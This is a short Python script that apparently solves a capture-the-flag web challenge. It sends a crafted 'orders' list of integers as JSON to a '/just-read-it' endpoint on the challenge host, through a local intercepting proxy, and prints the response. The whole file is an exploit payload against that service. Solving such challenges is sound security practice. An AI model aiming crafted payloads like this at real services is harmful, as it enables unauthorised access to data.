import requests

URL = "http://readme.chal.idek.team:1337/"


def get(payload: str, url=URL):
    res = requests.get(url+"/just-read-it",
                       json={
                           "orders": payload
                       },
                       proxies={"http": "http://localhost:8080"}
                       )
    return res.text


if __name__ == "__main__":
    a = get([
        100,
        100,
        100,
        99,
        99,
        99,
        8,
        32
    ])
    print(a)
